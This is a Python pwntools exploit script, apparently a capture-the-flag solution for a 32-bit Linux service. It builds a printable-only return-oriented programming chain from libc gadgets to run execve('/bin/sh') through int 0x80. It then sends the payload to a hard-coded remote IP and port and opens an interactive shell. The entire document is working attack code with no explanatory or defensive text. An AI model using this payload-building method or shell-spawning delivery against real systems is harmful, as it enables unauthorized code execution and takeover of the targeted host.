#!/usr/bin/env python
from pwn import *
context.update(arch='i386', os='linux')
p, u = pack, unpack

import re

def validate(data, strict=True):
    if ' ' in data:
        return False
    if '\r' in data:
        return False
    if '\n' in data:
        return False
    if '\t' in data:
        return False
    for i, c in enumerate(data):
        if not 0x1f < ord(c) < 0x7f:
            if strict:
               assert False, 'invalid char at {}: {}'.format(i, data.encode('hex'))
            else:
                return False
    return True

libc_base = 0x5555e000
libc = open('libc.so').read()
def find(pattern):
    for m in re.finditer(pattern, libc, re.MULTILINE):
        addr = libc_base + m.start()
        if validate(p(addr), strict=False):
            return addr
    return None

binsh = libc_base + libc.index('/bin/sh\0')
syscall = find('\xcd\x80')
ret = find('\xc3') # ret
# Pop edi, esi, ebp, ebx, edx, ecx, eax.
popa_ret = find('\x61\xc3') # popa; ret
add_edx_eax_ret = find('\x01\xd0\xc3')
add_esp_8_ret = find('\x83\xc4\x08\xc3') # add esp, 8; ret

xor_eax_eax_ret = find('\x31\xc0\xc3') # xor eax, eax; ret
inc_eax_ret = find('\x40\xc3') # inc eax; ret

pop_edi_ret = find(re.escape('\x5f\xc3'))
pop_esi_ret = find(re.escape('\x5e\xc3'))
pop_ebp_ret = find(re.escape('\x5d\xc3'))

pusha_ret = find('\x60\xc3') # push esp; ret
zeros = find(p(0))
'''
  105040:       8b 44 24 04             mov    0x4(%esp),%eax
  105044:       25 ff ff 00 00          and    $0xffff,%eax
  105049:       66 c1 c8 08             ror    $0x8,%ax
  10504d:       c3                      ret
'''
rol_gadget = libc_base + 0x105040
ror8_eax_ret = libc_base + 0x105049

def rol16(n, b):
    return (n << b) & 0xffff | (n >> (16 - b))

DEFAULT=0x41414141
def popa(edi=DEFAULT, esi=DEFAULT, ebp=DEFAULT, ebx=DEFAULT, edx=DEFAULT, ecx=DEFAULT, eax=DEFAULT):
    payload = ''
    payload += p(popa_ret)
    payload += p(edi)
    payload += p(esi)
    payload += p(ebp)
    payload += p(DEFAULT)
    payload += p(ebx)
    payload += p(edx)
    payload += p(ecx)
    payload += p(eax)
    return payload

start = 0x556b2f64
diff = (binsh - start) / 2
print hex(diff)
payload = 'A' * 0x20
payload += popa(edi=ret, esi=popa_ret)

payload += p(rol_gadget)
payload += p(add_esp_8_ret)
payload += p(0x41410000 | rol16(diff, 8))
payload += p(DEFAULT)

payload += p(pusha_ret)
payload += p(DEFAULT) # ecx
payload += p(start) # eax

payload += p(add_edx_eax_ret)
payload += p(add_edx_eax_ret)

# eax now contains "/bin/sh"

payload += p(pop_edi_ret)
payload += p(ret)
payload += p(pop_esi_ret)
payload += p(ret)
payload += p(pop_ebp_ret)
payload += p(popa_ret)

payload += p(pusha_ret)
payload += p(zeros) # ebx
payload += p(zeros) # ecx
payload += p(zeros) # eax

payload += p(xor_eax_eax_ret)
payload += p(inc_eax_ret) * 11

payload += p(syscall)

validate(payload)
assert len(payload) < 2400

conn = remote('202.120.7.214', 23222)
conn.sendline(payload)

conn.interactive(prompt='')
